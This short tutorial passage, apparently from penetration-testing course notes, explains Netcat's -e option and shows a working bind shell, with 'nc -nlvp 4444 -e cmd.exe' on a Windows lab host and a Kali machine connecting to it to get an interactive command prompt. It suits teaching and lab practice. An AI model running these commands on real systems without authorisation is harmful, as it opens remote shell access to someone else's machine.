# Remote Administration

One of the most useful features of Netcat is its ability to do command redirection. The netcat-traditional version of Netcat (compiled with the `-DGAPING_SECURITY_HOLE` flag) enables the `-e` option, which executes a program after making or receiving a successful connection.

This allows the commands (received through netcat from remote machine) to be redirected as input to whatever program is listed after the `-e` flag.&#x20;

```powershell
C:\Users\offsec> nc -nlvp 4444 -e cmd.exe
listening on [any] 4444 ...
```

And the remote connection would be made

```bash
kali@kali:~$ nc -nv 10.11.0.22 4444
(UNKNOWN) [10.11.0.22] 4444 (?) open
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.


C:\Users\offsec>
```

Thus giving the remote user an interactive shell. This is a highly simplified example of a **bind shell**. More information on Web Shells can be found [here](../../attack-vectors/shells/).
